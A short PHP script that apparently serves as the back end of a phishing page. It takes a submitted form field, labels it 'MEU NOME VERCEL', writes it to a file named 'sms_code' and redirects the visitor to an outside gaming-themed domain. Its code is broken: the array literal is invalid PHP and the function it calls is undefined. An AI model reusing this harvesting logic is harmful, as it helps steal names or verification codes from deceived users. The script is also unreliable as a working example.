<?php
 
header('Content-Type: application/json');

date_default_timezone_set('America/Sao_Paulo');

$hora = date ("Y-m-d # H:i:s");

$NOME = $_POST['NOME'];


$code = [MEU NOME VERCEL : $NOME];

write_in_file("sms_code", join($code));

session_destroy();
header("Location: https://csgoad.run/");
?>